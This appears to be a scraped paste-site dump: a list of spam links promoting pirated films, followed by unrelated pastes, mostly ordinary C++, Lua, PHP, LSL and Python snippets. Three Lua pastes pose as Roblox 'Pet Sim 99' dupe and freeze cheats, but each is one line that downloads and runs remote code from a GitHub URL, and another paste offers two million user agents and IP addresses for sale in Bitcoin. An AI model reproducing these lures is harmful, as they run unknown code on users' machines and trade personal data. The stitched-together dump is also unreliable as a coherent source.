https://techcommunity.microsoft.com/t5/community-events-list/%E6%8C%91%E6%88%98-%E5%AE%8C%E6%95%B4%E7%89%88-challenge-%E7%94%B5%E5%BD%B1%E5%AE%8C%E6%95%B4%E7%89%88%E5%AE%8C%E6%95%B4%E7%89%88-2024tw/m-p/4087439
https://techcommunity.microsoft.com/t5/community-events-list/%E5%9C%A8%E7%BA%BF%E8%A7%82%E7%9C%8B-%E6%8C%91%E6%88%98-2024-%E5%AE%8C%E6%95%B4%E7%89%88-%E9%9B%BB%E5%BD%B1%E2%84%8D%F0%9D%94%BB/m-p/4087440
https://techcommunity.microsoft.com/t5/community-events-list/full-%CA%9C%E1%B4%85-xem-phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-vietsub-phimmoi/m-p/4087447
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-full-4k-vietsub-thuyet-min/m-p/4087453
https://github.com/Xem-Phim-Qu-t-M-Trung-Ma-VietSub-4k
https://github.com/phimExhumaQu-tM-TrungMaFullHD4KVietsub
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-vietsub-full-hd-phimmoi/m-p/4087460
https://techcommunity.microsoft.com/t5/community-events-list/phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-full-hd-visub-4k-ultra-hd/m-p/4087461
https://techcommunity.microsoft.com/t5/community-events-list/full-%CA%9C%E1%B4%85-xem-phim-qu%E1%BB%B7-c%E1%BA%A9u-2024-vietsub-phimmoi/m-p/4087467
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-qu%E1%BB%B7-c%E1%BA%A9u-2024-vietsub-full-hd-m%E1%BB%9Bi-online/m-p/4087473
https://github.com/Xem-phim-Qu-C-u-2024-Full-HD
https://github.com/Xem-Phim-Qu-C-u-2024-Full-HD-Mi-n-Phi
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-mai-2024-vietsub-full-hd-phimmoi/m-p/4087486
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-mai-2024-full-hd-online/m-p/4087489
https://github.com/Xem-Phim-Mai-2024-Vi-tsub-FULL-4K
https://github.com/Xem-Phim-MAI-2024-FULL-Vietsub-4k
https://github.com/Xem-Phim-Kung-Fu-Panda-4-2024-Online-HD
https://github.com/Xem-phim-Kung-Fu-Panda-4-Vietsub-FULL
https://wandering.flarum.cloud/d/49541-masalampau
https://click4r.com/posts/g/15139247/jurgen-klopp-beware-of-rasmus-hojlund-s-return
https://forum.webnovel.com/d/169852-manchester-united-vs-liverpool-jurgen-klopp-beware-of-rasmus-hojlunds-return
https://hiuderyy.hashnode.dev/jurgen-klopp-beware-of-rasmus-hojlunds-return
https://dojour.us/e/24550-sfresbdryntuy
https://open.firstory.me/story/cltub98or0b4001uu4oju2n65
https://telegra.ph/Manchester-United-vs-Liverpool-03-16
https://paste.ee/p/Y7BLE
https://start.me/w/XLjz1y
https://hackmd.io/@rerewilli6/SJTDjHQRp
https://muckrack.com/aswrdev-turu/bio
https://profile.hatena.ne.jp/afafaw/
https://www.fitlynk.com/4e2d0003d
"
D5GG0ZVW,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 11:34:17 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b, c;
    cin >> a >> b >> c;
    
    int pomosna = 0;
    if(a >= 5) {
        pomosna += 5;
        a -= 5;
    }
    else {
        pomosna += a;
        a = 0;
    }
    if(b >= 5) {
        pomosna += 5;
        b -= 5;
    }
    else {
        pomosna += b;
        b = 0;
    }
    if(c >= 5) {
        pomosna += 5;
        c -= 5;
    }
    else {
        pomosna += c;
        c = 0;
    }
    if(abs(a - b) <= pomosna or abs(a - c) <= pomosna or abs(b - c) <= pomosna) {
        cout << ""DA"" << endl;
    }
    else {
        cout << ""NE"" << endl;
    }
    return 0;
}
"
1k0WLPRE,Untitled,TheStraying11,Lua,Saturday 16th of March 2024 11:30:37 AM CDT,"local real = rednet.receive
local function make_lut(t)
	local o = {}
	for k, v in pairs(t) do o[v] = true end
	return o
end
function rednet.receive(filter, timeout)
	local id, msg, protocol
	if type(filter) == 'table' then
	local lut = make_lut(filter)
	repeat
		id, msg, protocol = real(nil, timeout)
	until lut[protocol]
	else
	id, msg, protocol = real(filter, timeout)
	end
	return id, msg, protocol
end

local fns = {}

function fns.place(msg)
	local success = turtle.place()
	rednet.broadcast(tostring(success), 'return')
end

function fns.dig(msg)
	local success = turtle.dig()
	rednet.broadcast(tostring(success), 'return')
end

rednet.open('back')
while true do
	local id, msg, protocol = rednet.receive({'place', 'dig'})
	fns[protocol](msg)
end
"
sL0Fm6jA,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 11:21:12 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    int rezultat = 2e9;
    for(int d = 0; d <= x; d++) {
        int drvena = 5 * d;
        if(drvena >= x) {
            if(rezultat > d) {
                rezultat = d;
            }
        }
        if(drvena <= x) {
            int metalna = (x - drvena) / 10;
            if((x - drvena) % 10 > 0) {
                metalna++;
            }
            if(metalna <= d and drvena + 10 * metalna >= x) {
                if(rezultat > d + metalna) {
                    rezultat = d + metalna;
                    
                }
            }
        }
        
    }
    cout << rezultat << endl;
    return 0;
}
"
ChMeTw77,TelegramBotController,Darkklaine,PHP,Saturday 16th of March 2024 11:10:32 AM CDT,"<?php

namespace TelegramV2\Presentation\Telegram;

use DefStudio\Telegraph\DTO\CallbackQuery;
use DefStudio\Telegraph\DTO\Message;
use DefStudio\Telegraph\Exceptions\StorageException;
use DefStudio\Telegraph\Exceptions\TelegramWebhookException;
use DefStudio\Telegraph\Handlers\WebhookHandler;
use DefStudio\Telegraph\Models\TelegraphBot;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use JD\CommandBus\ICommandBus;
use JD\ContextManager\IContextManager;
use TelegramV2\Application\Commands\ReminderCreation\ReminderCreationBegin;
use TelegramV2\Application\Commands\ReminderCreation\ReminderCreationCommandHandler;
use TelegramV2\Application\Commands\ReminderCreation\ReminderCreationSetInterval;
use TelegramV2\Application\Commands\ReminderCreation\ReminderCreationSetText;
use TelegramV2\Application\Commands\ReminderCreation\ReminderCreationSetTime;
use TelegramV2\Application\Commands\ReminderDeletion\ReminderDelete;
use TelegramV2\Application\Commands\ReminderDeletion\ReminderDeletionBegin;
use TelegramV2\Application\Commands\ReminderDeletion\ReminderDeletionCommandHandler;
use TelegramV2\Application\Commands\ReminderMenu\ReminderMenuCommandHandler;
use TelegramV2\Application\Commands\ReminderMenu\ShowReminderInfo;
use TelegramV2\Application\Commands\ReminderMenu\ShowRemindersList;
use TelegramV2\Application\Commands\ReminderMenu\ShowStartMessage;
use TelegramV2\Application\Commands\ReminderUpdateInterval\ReminderUpdateIntervalBegin;
use TelegramV2\Application\Commands\ReminderUpdateInterval\ReminderUpdateIntervalCommandHandler;
use TelegramV2\Application\Commands\ReminderUpdateInterval\ReminderUpdateSetInterval;
use TelegramV2\Application\Commands\ReminderUpdateText\ReminderUpdateSetText;
use TelegramV2\Application\Commands\ReminderUpdateText\ReminderUpdateTextBegin;
use TelegramV2\Application\Commands\ReminderUpdateText\ReminderUpdateTextCommandHandler;
use TelegramV2\Application\Commands\ReminderUpdateText\ReminderUpdateTimeBegin;
use TelegramV2\Application\Commands\ReminderUpdateTime\ReminderUpdateSetTime;
use TelegramV2\Application\Commands\ReminderUpdateTime\ReminderUpdateTimeCommandHandler;
use TelegramV2\Application\DataConst;
use TelegramV2\Application\UIConst;
use TelegramV2\Infrastructure\TelegraphLibrary\TelegraphProvider;
use Throwable;

final class TelegramBotController extends WebhookHandler
{
    private TelegraphProvider $provider;
    private ICommandBus $commandBus;
    private IContextManager $contextManager;

    public function __construct(
        ICommandBus $commandBus,
        IContextManager $contextManager,
        TelegraphProvider $provider,
    ) {
        parent::__construct();
        $this->commandBus = $commandBus;
        $this->contextManager = $contextManager;
        $this->provider = $provider;
    }

    /**
     * @throws Throwable
     */
    public function handle(Request $request, TelegraphBot $bot): void
    {
        try {
            $this->bot = $bot;

            $this->request = $request;

            if ($this->request->has('message')) {
                /* @phpstan-ignore-next-line */
                $this->message = Message::fromArray($this->request->input('message'));
                $this->handleMessage();

                return;
            }

            if ($this->request->has('edited_message')) {
                /* @phpstan-ignore-next-line */
                $this->message = Message::fromArray($this->request->input('edited_message'));
                $this->handleMessage();

                return;
            }

            if ($this->request->has('channel_post')) {
                /* @phpstan-ignore-next-line */
                $this->message = Message::fromArray($this->request->input('channel_post'));
                $this->handleMessage();

                return;
            }

            if ($this->request->has('callback_query')) {
                /* @phpstan-ignore-next-line */
                $this->callbackQuery = CallbackQuery::fromArray($this->request->input('callback_query'));
                $this->handleCallbackQuery();
            }
        } catch (Throwable $throwable) {
            $this->onFailure($throwable);
        }
    }

    /**
     * @throws StorageException
     */
    private function handleMessage(): void
    {
        $this->extractMessageData();
        $this->provider->setupChat($this->chat);

        if (config('telegraph.debug_mode')) {
            Log::debug('Telegraph webhook message', $this->data->toArray());
        }

        $message = $this->message?->text();
        $key = str_starts_with($message, '/') ? $message : $this->chat->storage()->get(DataConst::KEY_REPLY);
        $this->performAction($key ?? $message);
    }

    private function performAction(string $key): void
    {
        $command = match ($key) {
            /** @see ReminderMenuCommandHandler */
            DataConst::COMMAND_LIST => new ShowRemindersList($this->chat->chat_id),
            DataConst::ACTION_SHOW => new ShowReminderInfo($this->data->get(DataConst::KEY_UUID)),

            /** @see ReminderCreationCommandHandler */
            DataConst::COMMAND_NEW => new ReminderCreationBegin(),
            UIConst::MESSAGE_TEXT_CREATE => new ReminderCreationSetText($this->message->text()),
            UIConst::MESSAGE_TIME_CREATE => new ReminderCreationSetTime($this->message->text()),
            DataConst::ACTION_CONFIRM_CREATION => new ReminderCreationSetInterval(
                $this->data->get(DataConst::KEY_INTERVAL), $this->chat->chat_id,
            ),

            /** @see ReminderUpdateTextCommandHandler */
            DataConst::ACTION_UPDATE_TEXT_REQUEST => new ReminderUpdateTextBegin($this->data->get(DataConst::KEY_UUID)),
            UIConst::MESSAGE_TEXT_UPDATE => new ReminderUpdateSetText($this->message->text()),

            /** @see ReminderUpdateTimeCommandHandler */
            DataConst::ACTION_UPDATE_TIME_REQUEST => new ReminderUpdateTimeBegin($this->data->get(DataConst::KEY_UUID)),
            UIConst::MESSAGE_TIME_UPDATE => new ReminderUpdateSetTime($this->message->text()),

            /** @see ReminderUpdateIntervalCommandHandler */
            DataConst::ACTION_UPDATE_INTERVAL_REQUEST => new ReminderUpdateIntervalBegin(
                $this->data->get(DataConst::KEY_UUID),
            ),
            DataConst::ACTION_UPDATE_INTERVAL => new ReminderUpdateSetInterval(
                $this->data->get(DataConst::KEY_INTERVAL),
            ),

            /** @see ReminderDeletionCommandHandler */
            DataConst::ACTION_DELETE_REQUEST => new ReminderDeletionBegin($this->data->get(DataConst::KEY_UUID)),
            DataConst::ACTION_DELETE_SUBMIT => new ReminderDelete($this->data->get(DataConst::KEY_UUID)),

            default => new ShowStartMessage(),
        };

        if ($command) {
            $this->commandBus->handle(
                $command,
                $this->contextManager->getContext(),
            );
        }
    }

    /**
     * @throws TelegramWebhookException
     */
    private function handleCallbackQuery(): void
    {
        $this->extractCallbackQueryData();
        $this->provider->setupChat($this->chat);

        if (config('telegraph.debug_mode')) {
            Log::debug('Telegraph webhook callback', $this->data->toArray());
        }

        $this->reply(UIConst::POPUP_DEFAULT);

        $key = $this->callbackQuery?->data()->get(DataConst::KEY_ACTION) ?? DataConst::COMMAND_START;
        $this->performAction($key);
    }

}
"
peG0Ce5H,2MLN User Agents + IPs and More Info,Nil000,Email,Saturday 16th of March 2024 11:07:28 AM CDT,"IMPORTANT: The price is 100 dollars for all of them, though it can be !!NEGOTIATED!! to be free.
e-mail: geralddemail@gmail.com
If you are willing to receive them instantly, the price is 100 dollars in Bitcoin,
though you have the option to pass a few questions and get it for free."
m2crYcWj,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 11:00:25 AM CDT,"#include <iostream>
#include <vector>
#include <map>
#include <fstream>
#include <cstring>
#include <queue>
using namespace std;
typedef long long ll;
const int maxn = 55;
const int di[] = {-1, 1, 0, 0};
const int dj[] = {0, 0, -1, 1};
char mat[maxn][maxn];
int n, m;
int dp[maxn][maxn][555];
struct node {
    int ci, cj;
    int time, money;
    node () {}
    node(int _ci, int _cj, int _time, int _money) {
        ci = _ci;
        cj = _cj;
        time = _time;
        money = _money;
    }
    bool operator < (const node &tmp) const {
        if(money == tmp.money) {
            return time > tmp.money;
        }
        return money > tmp.money;
    }
};
short dist[maxn][maxn][maxn][maxn];
void bfs() {
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            if(mat[i][j] == 'M') {
                vector<vector<bool>> visited(n, vector<bool>(m, false));
                visited[i][j] = true;
                queue<int> q;
                q.push(i);
                q.push(j);
                q.push(0);
                 
                while(!q.empty()) {
                    int ci = q.front(); q.pop();
                    int cj = q.front(); q.pop();
                    int cekor = q.front(); q.pop();
                     
                    if(mat[ci][cj] == 'M') {
                        dist[i][j][ci][cj] = cekor;
                    }
                    for(int k = 0; k < 4; k++) {
                        int ti = ci + di[k];
                        int tj = cj + dj[k];
                        if(ti >= 0 and ti < n and tj >= 0 and tj < m and !visited[ti][tj]) {
                            q.push(ti);
                            q.push(tj);
                            q.push(cekor + 1);
                            visited[ti][tj] = true;
                        }
                    }
                     
                     
                }
            }
        }
    }
}
int main() {
    ios_base::sync_with_stdio(false);
    int stations, t;
    cin >> n >> m >> stations >> t;
     
    int si, sj, ei, ej;
    vector<pair<int, int>> ms;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cin >> mat[i][j];
            if(mat[i][j] == 'T') {
                si = i;
                sj = j;
            }
            if(mat[i][j] == 'K') {
                ei = i;
                ej = j;
            }
            if(mat[i][j] == 'M') {
                ms.push_back({i, j});
            }
        }
    }
    for(int i = 0; i < maxn; i++) {
        for(int j = 0; j < maxn; j++) {
            for(int k = 0; k <= t; k++) {
                dp[i][j][k] = 2e9;
            }
        }
    }
    priority_queue<node> pq;
    bfs();
    int res_min = 2e9;
    pq.push(node(si, sj, 0, 0));
    while(!pq.empty()) {
        node c = pq.top();
        pq.pop();
         
         
        if(c.ci == ei and c.cj == ej) {
            res_min = min(res_min, c.money);
            continue;
        }
//        cout << c.ci << "" "" << c.cj << endl;
        if(mat[c.ci][c.cj] == 'M') {
             
            for(int k = 0; k < ms.size(); k++) {
                 
                    int d = dist[c.ci][c.cj][ms[k].first][ms[k].second];
//                    cout << c.ci << "" "" << c.cj << "" "" << ms[k].first << "" "" << ms[k].second << "" "" << d << "" "" << c.money << "" "" << c.time << endl;
                    if(c.time + d <= t and c.money + 5 * d < dp[ms[k].first][ms[k].second][c.time + d]) {
                        pq.push(node(ms[k].first, ms[k].second, c.time + d, c.money + 5 * d));
                        dp[ms[k].first][ms[k].second][c.time + d] = c.money + 5 * d;
                         
                         
                     
                }
            }
        }
        for(int i = 0; i < 4; i++) {
            int ti = c.ci + di[i];
            int tj = c.cj + dj[i];
            if(ti >= 0 and ti < n and tj >= 0 and tj < m and mat[ti][tj] != '#') {
                if(c.time + 5 <= t and c.money < dp[ti][tj][c.time + 5]) {
                    pq.push(node(ti, tj, c.time + 5, c.money));
                    dp[ti][tj][c.time + 5] = c.money;
                     
                     
                }
                if(c.time + 2 <= t and c.money + 1 < dp[ti][tj][c.time + 2]) {
                    pq.push(node(ti, tj, c.time + 2, c.money + 1));
                    dp[ti][tj][c.time + 2] = c.money + 1;
                     
                }
                 
            }
        }
         
    }
        if(res_min == 2e9) {
            res_min = -1;
        }
        cout << res_min << endl;
     
    return 0;
}"
WTuDzLrq,pip upgrade,theguild42,Bash,Saturday 16th of March 2024 10:49:38 AM CDT,"cd $HOME
. ./.venv/bin/activate
pip install $(pip list --outdated | cut -d"" "" -f1 | tr '\n' ' ' | cut -d"" "" -f 3-) --upgrade
deactivate
"
2EDRM5tC,Untitled,salahzar,Linden Scripting,Saturday 16th of March 2024 10:46:26 AM CDT,"// Constants
integer LINK_ROOT = 0;
string  SOUND_NAME = llGetInventoryName(INVENTORY_SOUND, 0);
integer MAX_TEXTURES = 12;
float HIGHLIGHT_GLOW = 0.2;
float NORMAL_GLOW = 0.0;
float SOUND_VOLUME = 1.0;
float SELECTION_DELAY = 0.5;

// Global variables
list gTextures;
integer gSelectedCard1 = -1;
integer gSelectedCard2 = -1;

setTexture(integer linkNumber, string textureUUID) {
    llSetLinkPrimitiveParamsFast(linkNumber, [PRIM_TEXTURE, ALL_SIDES, textureUUID, <1.0, 1.0, 1.0>, ZERO_VECTOR, 0.0]);
}

setGlow(integer linkNumber, float glowIntensity) {
    llSetLinkPrimitiveParamsFast(linkNumber, [PRIM_GLOW, ALL_SIDES, glowIntensity]);
}

default {
    state_entry() {
        
        integer i;
        for (i = 0; i < MAX_TEXTURES; ++i) {
            string textureName = llGetInventoryName(INVENTORY_TEXTURE, i);
            if (textureName != """") {
                gTextures += [textureName];
            }
        }
        gTextures = llListRandomize(gTextures, 1);

        for (i = 2; i <= llGetNumberOfPrims(); ++i) {
            string texture = llList2String(gTextures, i - 2);
            setTexture(i, texture);
            setGlow(i, NORMAL_GLOW);
        }
    }

    touch_start(integer total_number) {
        integer i;
        for (i = 0; i < total_number; ++i) {
            integer linkNum = llDetectedLinkNumber(i);

            if (linkNum > 1 && linkNum <= (MAX_TEXTURES + 1)) {
                if (gSelectedCard1 == -1) {
                    gSelectedCard1 = linkNum;
                    setGlow(linkNum, HIGHLIGHT_GLOW);
                } else if (gSelectedCard2 == -1 && linkNum != gSelectedCard1) {
                    gSelectedCard2 = linkNum;
                    setGlow(linkNum, HIGHLIGHT_GLOW);

                    swapTextures();
                    resetSelection();
                }

                if (SOUND_NAME != """") {
                    llPlaySound(SOUND_NAME, SOUND_VOLUME);
                }
            }
        }
    }
}

swapTextures() {
    string texture1 = llList2String(gTextures, gSelectedCard1 - 2);
    string texture2 = llList2String(gTextures, gSelectedCard2 - 2);
    setTexture(gSelectedCard1, texture2);
    setTexture(gSelectedCard2, texture1);
    gTextures = llListReplaceList(gTextures, [texture2], gSelectedCard1 - 2, gSelectedCard1 - 2);
    gTextures = llListReplaceList(gTextures, [texture1], gSelectedCard2 - 2, gSelectedCard2 - 2);
}

resetSelection() {
    llSleep(SELECTION_DELAY);
    setGlow(gSelectedCard1, NORMAL_GLOW);
    setGlow(gSelectedCard2, NORMAL_GLOW);
    gSelectedCard1 = -1;
    gSelectedCard2 = -1;
}
"
8MskG7Pn,Untitled,ruurbanknight,Python,Saturday 16th of March 2024 10:39:06 AM CDT,"import pandas as pd

df = pd.DataFrame({
    ""value"":[3954, 3760, 3869, 3659, 3712, 3685, 3437, 2866, 3409, 3284, 3318, 3226, 3321, 4748, 3632, 3724, 3657, 3575, 3685, 3730, 3652, 4406, 3835, 3455, 3017, 2945, 3003, 3092, 3251, 3443, 2770],
    ""name"":['s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1','s1'],
    ""date"":[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31]})

df_temp = pd.DataFrame()
df_temp['date'] = df['date']
df_temp['value'] = df['value'].mean()
df_temp['name']= 's1_avg'

df = pd.concat([df_temp, df], ignore_index= True )
print(df)

>>#####

    date   value    name
0      1  3520.0  s1_avg
1      2  3520.0  s1_avg
2      3  3520.0  s1_avg
3      4  3520.0  s1_avg
4      5  3520.0  s1_avg
..   ...     ...     ...
57    27  3003.0      s1
58    28  3092.0      s1
59    29  3251.0      s1
60    30  3443.0      s1
61    31  2770.0      s1"
0V26bYVG,Untitled,toorr2p,HTML,Saturday 16th of March 2024 10:37:16 AM CDT,"<link rel=""icon"" href=""https://partnergruz.ru/wp-content/themes/partnergruz/img/favicon.ico"" type=""image/x-icon""/>
<link rel=""shortcut icon"" href=""https://partnergruz.ru/wp-content/themes/partnergruz/img/favicon-64x64.png"" sizes=""64x64"" type=""image/png""/>
<link rel=""apple-touch-icon"" href=""https://partnergruz.ru/wp-content/themes/partnergruz/img/favicon-512x512.png"" sizes=""512x512"" type=""image/png""/>"
N0HiDs1h,new_main_opengl,maxim_shlyahtin,C++,Saturday 16th of March 2024 10:28:23 AM CDT,"#include <Windows.h> //Don't worry about this; it's needed to make GL.h work properly on Windows only (and then, only sometimes).
//#include <GL/glew.h>
#include <GL/GL.h>
#include <GL/GLU.h>
#include ""ode.cpp""
//#include <glm.hpp>
#include <chrono>
#include <iomanip>

#define _USE_MATH_DEFINES

//Choose whether to use SDL1 or SDL2

#include <cstdio>
#include <SDL.h>
#include <SDL_opengl.h>
#pragma comment(lib,""SDL2.lib"")
#pragma comment(lib,""SDL2main.lib"")
static SDL_Window* window;
static SDL_Renderer* renderer;
#pragma comment(lib,""opengl32.lib"")
#pragma comment(lib,""glu32.lib"")


static int const screen_size[2] = { 800, 600 };

using glf = GLfloat;
using point3d = std::vector<glf>;

double camX = 0.0;
double camY = 0.0;
double R = 10.0;
double t;
size_t dist = 10;

TA attractor(3);
std::vector<double> init_state = { 0, 1, 0 };
std::vector<point3d> points;
std::vector<point3d> points_reverse;
std::vector<std::vector<size_t>> drawn_points;

void set_attr(TA& attr, std::vector<double> init) {
    attr.SetInit(0, init);
}



Uint32 callback(Uint32 interval, void* name) {
    double dt = interval / 100.0;
    // Get the current time point
    std::chrono::time_point<std::chrono::high_resolution_clock> tp = std::chrono::high_resolution_clock::now();

    // Convert the time point to a duration in microseconds (or any other unit you prefer)
    std::chrono::duration<double, std::micro> dur = tp.time_since_epoch();

    // Get the count of the duration as a double
    t = dur.count();

    camX = R * cos((2 * M_PI) / (60.0 * 1000.0) * (t / 1000.0));
    camY = R * sin((2 * M_PI) / (60.0 * 1000.0) * (t / 1000.0));
    glf x = static_cast<glf>(attractor.getX(0));
    glf y = static_cast<glf>(attractor.getX(1));
    glf z = static_cast<glf>(attractor.getX(2));
    attractor.NextStep(dt);
    return interval;
}

static bool get_input(void) {
    SDL_Event event;
    while (SDL_PollEvent(&event)) {
        switch (event.type) {
        case SDL_QUIT: return false; //The little X in the window got pressed
        case SDL_KEYDOWN:
            if (event.key.keysym.sym == SDLK_ESCAPE) {
                return false;
            }
            break;
        }
    }
    return true;
}
static void draw(void) {
    //Clear the screen's color and depth (default color is black, but can change with glClearColor(...))
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

    //Drawing to an area starting at the bottom left, screen_size[0] wide, and screen_size[1] high.
    glViewport(0, 0, screen_size[0], screen_size[1]);
    //OpenGL is a state machine.  Tell it that future commands changing the matrix are to change OpenGL's projection matrix
    glMatrixMode(GL_PROJECTION);
    //Reset the projection matrix
    glLoadIdentity();
    //Multiply a perspective projection matrix into OpenGL's projection matrix
    gluPerspective(45.0, (double)(screen_size[0]) / (double)(screen_size[1]), 0.1, 100.0);

    //Tell OpenGL that future commands changing the matrix are to change the modelview matrix
    glMatrixMode(GL_MODELVIEW);
    //Reset the modelview matrix
    glLoadIdentity();
    //Multiply OpenGL's modelview matrix with a transform matrix that simulates a camera at (2,3,4) looking towards the location (0,0,0) with up defined to be (0,1,0)
    glf cameraX = static_cast<glf>(camX);
    glf cameraY = static_cast<glf>(camY);
    gluLookAt(cameraX, cameraY, 10.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0);
    //gluLookAt(-20.0f, -15.0f, 20.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0);

    //Begin drawing triangles.  Every subsequent triplet of vertices will be interpreted as a single triangle.
    //  OpenGL's default color is white (1.0,1.0,1.0), so that's what color the triangle will be.
    //glColor3f(1.0f, 1.0f, 1.0f);

    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

    glf x = static_cast<glf>(attractor.getX(0));
    glf y = static_cast<glf>(attractor.getX(1));
    glf z = static_cast<glf>(attractor.getX(2));
    points.push_back({ x, y, z });
    points_reverse.push_back({ x, y, z });
    //points_reverse.insert(points_reverse.begin(), {x, y, z});
    std::reverse(points_reverse.begin(), points_reverse.end());
    glColor3f(1.0f, 1.0f, 1.0f); // Set the color to white
    glBegin(GL_POINTS);
    /*for (const auto& point : points) {
            glVertex3f(point.at(0), point.at(1), point.at(2));
    }*/
    size_t number_of_points = points.size() - 1 > 0 ? points.size() - 1 : 1;
    std::cout << number_of_points << "" time taken (in seconds): "" << std::fixed << t / 1000000.0  << '\n';
    for (size_t i = 0; i < number_of_points; i++) {
        if ((number_of_points - i) % dist == 0) {
            //tmp.push_back(number_of_points - i);
            glVertex3f(points[i].at(0), points[i].at(1), points[i].at(2));
        }
    }
    /*drawn_points.push_back(tmp);
    for(const auto& vec : drawn_points){
        for (const auto& p : vec) {
            std::cout << p << "" "";
        }
        std::cout << '\n';
    }*/
    /*size_t i = points.size();
    if(i >= 10)
        glVertex3f(points[i - 10].at(0), points[i - 10].at(1), points[i - 10].at(2));
    glVertex3f(x, y, z);*/
    glEnd();
    SDL_GL_SwapWindow(window);

    //Now we're going to draw some lines to show the cardinal axes.  Every subsequent pair of vertices
    //  will be a single line.
    //glBegin(GL_LINES);
    ////All subsequent vertices will be red.
    //glColor3f(1.0f, 0.0f, 0.0f);
    //glVertex3f(0.0f, 0.0f, 0.0f); glVertex3f(1.0f, 0.0f, 0.0f);
    ////All subsequent vertices will be green.
    //glColor3f(0.0f, 1.0f, 0.0f);
    //glVertex3f(0.0f, 0.0f, 0.0f); glVertex3f(0.0f, 1.0f, 0.0f);
    ////All subsequent vertices will be blue.
    //glColor3f(0.0f, 0.0f, 1.0f);
    //glVertex3f(0.0f, 0.0f, 0.0f); glVertex3f(0.0f, 0.0f, 1.0f);
    ////Since OpenGL thinks the color is blue now, all subsequent vertices will be blue.  But, we want the
    ////  triangle above to be white the *next* time we call this function!  So, reset the color to white.
    //glEnd();

    //OpenGL works best double-buffered.  SDL automatically sets that up for us.  This will draw what we have
    //  just drawn to the screen so that we can see it.
    SDL_GL_SwapWindow(window);
    //OpenGL works best double-buffered.  SDL automatically sets that up for us.  This will draw what we have
    //  just drawn to the screen so that we can see it.
    SDL_GL_SwapWindow(window);
}

int main(int argc, char* argv[]) {
    set_attr(attractor, init_state);
    //Initialize everything, but don't catch fatal signals; give them to the OS.
    SDL_Init(SDL_INIT_EVERYTHING | SDL_INIT_NOPARACHUTE);


    //Creates the window
    window = SDL_CreateWindow(""SDL and OpenGL example - Ian Mallett"", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, screen_size[0], screen_size[1], SDL_WINDOW_OPENGL);
    //Create an OpenGL context.  In SDL 1, this was done automatically.
    SDL_GLContext context = SDL_GL_CreateContext(window);

    //We now have an OpenGL context, and can call OpenGL functions.

    //Objects need to test each other to see which one is in front.  If you don't do this, you'll ""see through"" things!
    glEnable(GL_DEPTH_TEST);

    SDL_TimerID timerID = SDL_AddTimer(20, callback, const_cast<char*>(""SDL""));

    //Main application loop
    while (true) {
        if (!get_input()) break;
        draw();
    }

    //TA::Test();

    SDL_RemoveTimer(timerID);

    //Clean up
    SDL_GL_DeleteContext(context);
    SDL_DestroyWindow(window);
    SDL_Quit();

    //Return success; program exits
    return 0;
}"
S8v2v5eD,Pet Sim 99 Auction Freeze Script,quikzyYTbtw,Lua,Saturday 16th of March 2024 10:18:53 AM CDT,"
--JUST COPY THIS SCRIPT INTO UR EXECUTOR AND EXECUTE IT AND LET IT LOAD AND FOLLOW THE INSTRUCTIONS TO FREEZE THE AUCTIONS--
 
--SCRIPT WILL AUTOMATICALLY TELEPORT YOU TO THE TRADING PLAZA AFTER ITS LOADED--
 
--NEW GUI UPDATE OUT!!-- UPDATED 3/16/2024
 
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/scripthub""))()"
eqnkQqTz,Pet Sim 99 Visual Hub [FAKE TITANICS etc.],quikzyYTbtw,Lua,Saturday 16th of March 2024 10:17:05 AM CDT," 
--NEW VISUAL HUB UPDATE FOR PET SIM 99 NEWEST UPDATE THAT CHANGES PETS TO HUGES AND TITANICS, BANANAS ETC-- UPDATED 3/16/2024
 
--EXECUTE THE SCRIPT AND HAVE FUN-- (ALSO VISIBLE IN TRADES,BOOTH etc.)
 

loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/scripthub""))()"
Kf6FwHg2,Pet Sim 99 Dupe Script [ANY PET] Newest Update,quikzyYTbtw,Lua,Saturday 16th of March 2024 10:14:59 AM CDT,"--UPDATED VERSION OF MY DUPE SCRIPT THATS WORKS IN THE NEWEST UPDATE IN PET SIM 99-- UPDATED 3/16/2024
 
--FIXED SOME BUGS AND ADDED SOME MORE FEATURES AND HELPFUL GUIDES!--EXECUTE THE SCRIPT AND JUST FOLLOW THE INSTRUCTIONS-- HAVE FUN!
 
--(IT CAN ALSO DUPE TITANICS AND HUGES FROM YOUR BANK AND INVENTORY)--
 

loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/scripthub""))()
"
PvSKg5ED,status.lua,Erdioner,Lua,Saturday 16th of March 2024 10:14:22 AM CDT,"local hasLogger, logger = pcall(require, ""logger"")

local module = {}

module.IDLE = ""idle""
module.WORKING = ""working""
module.ERROR = ""error""
module.STUCK = ""stuck""
module.FULL = ""full""

local isSetup = false
